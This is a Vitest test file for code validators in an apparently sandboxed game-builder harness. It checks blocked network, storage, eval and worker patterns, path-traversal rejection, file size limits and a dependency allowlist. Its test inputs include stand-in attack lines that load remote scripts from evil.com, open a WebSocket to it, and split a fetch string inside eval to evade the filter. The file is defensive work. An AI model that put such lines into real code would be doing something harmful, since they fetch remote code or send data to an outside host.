import { describe, it, expect } from 'vitest';

import {
  NETWORK_PATTERNS,
  STORAGE_PATTERNS,
  CODE_EXEC_PATTERNS,
  DOM_DANGER_PATTERNS,
  assertPathAllowed,
  assertFileSize,
  assertNoBlockedPatterns,
  assertFileExists,
  assertExactlyOneMatch,
  assertDependencyAllowed,
} from '../../../src/builder/lib/harness/validators';

describe('validators', () => {
  describe('pattern constants', () => {
    it('NETWORK_PATTERNS includes fetch, XMLHttpRequest, WebSocket, sendBeacon, importScripts, and import(', () => {
      expect(NETWORK_PATTERNS).toContain('fetch(');
      expect(NETWORK_PATTERNS).toContain('fetch (');
      expect(NETWORK_PATTERNS).toContain('XMLHttpRequest');
      expect(NETWORK_PATTERNS).toContain('new WebSocket');
      expect(NETWORK_PATTERNS).toContain('navigator.sendBeacon');
      expect(NETWORK_PATTERNS).toContain('importScripts');
      expect(NETWORK_PATTERNS).toContain('window.fetch');
      expect(NETWORK_PATTERNS).toContain('globalThis.fetch');
      expect(NETWORK_PATTERNS).toContain('import(');
    });

    it('STORAGE_PATTERNS includes localStorage, sessionStorage, document.cookie, indexedDB', () => {
      expect(STORAGE_PATTERNS).toContain('localStorage');
      expect(STORAGE_PATTERNS).toContain('sessionStorage');
      expect(STORAGE_PATTERNS).toContain('document.cookie');
      expect(STORAGE_PATTERNS).toContain('indexedDB');
    });

    it('CODE_EXEC_PATTERNS includes eval and new Function variants', () => {
      expect(CODE_EXEC_PATTERNS).toContain('eval(');
      expect(CODE_EXEC_PATTERNS).toContain('eval (');
      expect(CODE_EXEC_PATTERNS).toContain('new Function(');
      expect(CODE_EXEC_PATTERNS).toContain('new Function (');
    });

    it('DOM_DANGER_PATTERNS includes document.write, Worker, and ServiceWorker', () => {
      expect(DOM_DANGER_PATTERNS).toContain('document.write(');
      expect(DOM_DANGER_PATTERNS).toContain('document.writeln(');
      expect(DOM_DANGER_PATTERNS).toContain('new Worker(');
      expect(DOM_DANGER_PATTERNS).toContain('new SharedWorker(');
      expect(DOM_DANGER_PATTERNS).toContain('navigator.serviceWorker');
    });
  });

  describe('assertNoBlockedPatterns', () => {
    describe('static imports allowed', () => {
      it('allows import with braces', () => {
        expect(() =>
          assertNoBlockedPatterns(`import { GameEngine } from '../engine/GameEngine';`),
        ).not.toThrow();
      });

      it('allows default import', () => {
        expect(() =>
          assertNoBlockedPatterns(`import Matter from 'matter-js';`),
        ).not.toThrow();
      });

      it('allows import * as', () => {
        expect(() =>
          assertNoBlockedPatterns(`import * as helpers from './helpers';`),
        ).not.toThrow();
      });

      it('allows re-export statement', () => {
        expect(() =>
          assertNoBlockedPatterns(`export { Foo } from './foo';`),
        ).not.toThrow();
      });
    });

    describe('dynamic imports blocked', () => {
      it('blocks import() with URL', () => {
        expect(() =>
          assertNoBlockedPatterns(`const mod = await import('https://evil.com/script.js');`),
        ).toThrow(/import\(/);
      });

      it('blocks import() with relative path', () => {
        expect(() =>
          assertNoBlockedPatterns(`const mod = await import('./levels.ts');`),
        ).toThrow(/import\(/);
      });

      it('blocks import() with template literal', () => {
        expect(() =>
          assertNoBlockedPatterns('const mod = await import(`./levels/${name}.ts`);'),
        ).toThrow(/import\(/);
      });
    });

    describe('eval/Function blocked', () => {
      it('blocks eval()', () => {
        expect(() =>
          assertNoBlockedPatterns(`const x = eval('1+1');`),
        ).toThrow(/eval\(/);
      });

      it('blocks eval with space before paren', () => {
        expect(() =>
          assertNoBlockedPatterns(`const x = eval ('1+1');`),
        ).toThrow(/eval \(/);
      });

      it('blocks new Function()', () => {
        expect(() =>
          assertNoBlockedPatterns(`const fn = new Function('return 42');`),
        ).toThrow(/new Function\(/);
      });

      it('allows Function-suffixed identifiers (no false positive)', () => {
        expect(() =>
          assertNoBlockedPatterns(`function createHashFunction(x: number) { return x; }`),
        ).not.toThrow();
      });

      it('blocks eval used to bypass fetch', () => {
        expect(() =>
          assertNoBlockedPatterns(`eval('fe' + 'tch("https://evil.com")');`),
        ).toThrow(/eval\(/);
      });
    });

    describe('network blocked', () => {
      it('blocks fetch()', () => {
        expect(() =>
          assertNoBlockedPatterns(`const data = await fetch('https://api.example.com');`),
        ).toThrow(/fetch\(/);
      });

      it('blocks fetch with space', () => {
        expect(() =>
          assertNoBlockedPatterns(`const data = await fetch ('https://api.example.com');`),
        ).toThrow(/fetch \(/);
      });

      it('blocks XMLHttpRequest', () => {
        expect(() =>
          assertNoBlockedPatterns(`const xhr = new XMLHttpRequest();`),
        ).toThrow(/XMLHttpRequest/);
      });

      it('blocks new WebSocket', () => {
        expect(() =>
          assertNoBlockedPatterns(`const ws = new WebSocket('wss://evil.com');`),
        ).toThrow(/WebSocket/);
      });

      it('blocks navigator.sendBeacon', () => {
        expect(() =>
          assertNoBlockedPatterns(`navigator.sendBeacon('/log', data);`),
        ).toThrow(/sendBeacon/);
      });

      it('blocks importScripts', () => {
        expect(() =>
          assertNoBlockedPatterns(`importScripts('https://evil.com/script.js');`),
        ).toThrow(/importScripts/);
      });

      it('blocks window.fetch', () => {
        expect(() =>
          assertNoBlockedPatterns(`window.fetch('https://evil.com');`),
        ).toThrow(/Blocked/);
      });

      it('blocks globalThis.fetch', () => {
        expect(() =>
          assertNoBlockedPatterns(`globalThis.fetch('https://evil.com');`),
        ).toThrow(/Blocked/);
      });
    });

    describe('storage blocked', () => {
      it('blocks localStorage', () => {
        expect(() =>
          assertNoBlockedPatterns(`localStorage.setItem('key', 'value');`),
        ).toThrow(/localStorage/);
      });

      it('blocks sessionStorage', () => {
        expect(() =>
          assertNoBlockedPatterns(`sessionStorage.getItem('key');`),
        ).toThrow(/sessionStorage/);
      });

      it('blocks document.cookie', () => {
        expect(() =>
          assertNoBlockedPatterns(`const c = document.cookie;`),
        ).toThrow(/document\.cookie/);
      });

      it('blocks indexedDB', () => {
        expect(() =>
          assertNoBlockedPatterns(`const db = indexedDB.open('mydb');`),
        ).toThrow(/indexedDB/);
      });
    });

    describe('edge cases', () => {
      it('allows "import" in a variable name', () => {
        expect(() =>
          assertNoBlockedPatterns(`const importantValue = 42;\nconst reimported = true;`),
        ).not.toThrow();
      });

      it('allows "evaluate" (not "eval(")', () => {
        expect(() =>
          assertNoBlockedPatterns(`function evaluate(score: number) { return score > 100; }`),
        ).not.toThrow();
      });

      it('blocks comment containing eval()', () => {
        expect(() =>
          assertNoBlockedPatterns(`// TODO: don't use eval() here\nconst x = 1;`),
        ).toThrow(/eval\(/);
      });

      it('allows clean code with no blocked patterns', () => {
        expect(() =>
          assertNoBlockedPatterns(`const x = 42;\nconst y = x * 2;\nconsole.log(y);`),
        ).not.toThrow();
      });

      it('allows empty content', () => {
        expect(() => assertNoBlockedPatterns('')).not.toThrow();
      });
    });

    describe('DOM/worker patterns blocked', () => {
      it('blocks document.write(', () => {
        expect(() =>
          assertNoBlockedPatterns(`document.write('<h1>Hi</h1>');`),
        ).toThrow(/document\.write/);
      });

      it('blocks document.writeln(', () => {
        expect(() =>
          assertNoBlockedPatterns(`document.writeln('line');`),
        ).toThrow(/document\.writeln/);
      });

      it('blocks new Worker(', () => {
        expect(() =>
          assertNoBlockedPatterns(`const w = new Worker('worker.js');`),
        ).toThrow(/new Worker/);
      });

      it('blocks new SharedWorker(', () => {
        expect(() =>
          assertNoBlockedPatterns(`const sw = new SharedWorker('sw.js');`),
        ).toThrow(/new SharedWorker/);
      });

      it('blocks navigator.serviceWorker', () => {
        expect(() =>
          assertNoBlockedPatterns(`navigator.serviceWorker.register('/sw.js');`),
        ).toThrow(/navigator\.serviceWorker/);
      });
    });
  });

  describe('assertPathAllowed', () => {
    it('blocks path traversal with ..', () => {
      expect(() => assertPathAllowed('../../../etc/passwd', 'src/games/**')).toThrow(
        /directory traversal/,
      );
    });

    it('blocks .. in the middle of a path', () => {
      expect(() => assertPathAllowed('src/games/../secrets/key.ts', 'src/games/**')).toThrow(
        /directory traversal/,
      );
    });

    it('blocks absolute paths', () => {
      expect(() => assertPathAllowed('/etc/passwd', 'src/games/**')).toThrow(
        /absolute paths/,
      );
    });

    it('blocks paths outside src/games/', () => {
      expect(() => assertPathAllowed('src/engine/GameEngine.ts', 'src/games/**')).toThrow(
        /must be under src\/games\//,
      );
    });

    it('blocks paths at project root', () => {
      expect(() => assertPathAllowed('package.json', 'src/games/**')).toThrow(
        /must be under src\/games\//,
      );
    });

    it('allows valid paths under src/games/', () => {
      expect(() =>
        assertPathAllowed('src/games/my-game/index.ts', 'src/games/**'),
      ).not.toThrow();
    });

    it('allows nested paths under src/games/', () => {
      expect(() =>
        assertPathAllowed('src/games/my-game/utils/helpers.ts', 'src/games/**'),
      ).not.toThrow();
    });

    it('allows src/games/ directory itself', () => {
      expect(() =>
        assertPathAllowed('src/games/registry.ts', 'src/games/**'),
      ).not.toThrow();
    });
  });

  describe('assertFileSize', () => {
    it('blocks files over the size limit', () => {
      const content = 'x'.repeat(101);
      expect(() => assertFileSize(content, 100)).toThrow(/File too large: 101 chars \(max 100\)/);
    });

    it('allows files at exactly the size limit', () => {
      const content = 'x'.repeat(100);
      expect(() => assertFileSize(content, 100)).not.toThrow();
    });

    it('allows files under the size limit', () => {
      const content = 'x'.repeat(50);
      expect(() => assertFileSize(content, 100)).not.toThrow();
    });

    it('allows empty files', () => {
      expect(() => assertFileSize('', 100)).not.toThrow();
    });
  });

  describe('assertFileExists', () => {
    it('throws when file is not in the map', () => {
      expect(() => assertFileExists('missing.ts', {})).toThrow(/File not found: "missing.ts"/);
    });

    it('passes when file exists in the map', () => {
      expect(() =>
        assertFileExists('index.ts', { 'index.ts': 'content' }),
      ).not.toThrow();
    });

    it('throws with helpful message including file name', () => {
      expect(() => assertFileExists('foo/bar.ts', {})).toThrow(
        /Use writeFile to create it first/,
      );
    });
  });

  describe('assertExactlyOneMatch', () => {
    it('throws when search text has 0 matches', () => {
      expect(() => assertExactlyOneMatch('hello world', 'missing')).toThrow(
        /old_text not found in file/,
      );
    });

    it('passes when search text has exactly 1 match', () => {
      expect(() => assertExactlyOneMatch('hello world', 'hello')).not.toThrow();
    });

    it('throws when search text has 2 matches', () => {
      expect(() => assertExactlyOneMatch('hello hello world', 'hello')).toThrow(
        /old_text matches 2 times/,
      );
    });

    it('throws when search text has 3+ matches', () => {
      expect(() => assertExactlyOneMatch('aaa', 'a')).toThrow(
        /old_text matches 3 times/,
      );
    });

    it('error message suggests including more context', () => {
      expect(() => assertExactlyOneMatch('ab ab', 'ab')).toThrow(
        /Include more surrounding context/,
      );
    });
  });

  describe('assertDependencyAllowed', () => {
    const allowed = ['matter-js', 'howler', 'pixi.js'];

    it('passes for an allowed dependency', () => {
      expect(() => assertDependencyAllowed('matter-js', allowed)).not.toThrow();
    });

    it('passes for another allowed dependency', () => {
      expect(() => assertDependencyAllowed('pixi.js', allowed)).not.toThrow();
    });

    it('throws for a disallowed dependency', () => {
      expect(() => assertDependencyAllowed('axios', allowed)).toThrow(
        /Dependency "axios" not allowed/,
      );
    });

    it('error message lists allowed deps', () => {
      expect(() => assertDependencyAllowed('react', allowed)).toThrow(
        /Allowed: matter-js, howler, pixi\.js/,
      );
    });

    it('throws when allowed list is empty', () => {
      expect(() => assertDependencyAllowed('anything', [])).toThrow(
        /not allowed/,
      );
    });
  });
});
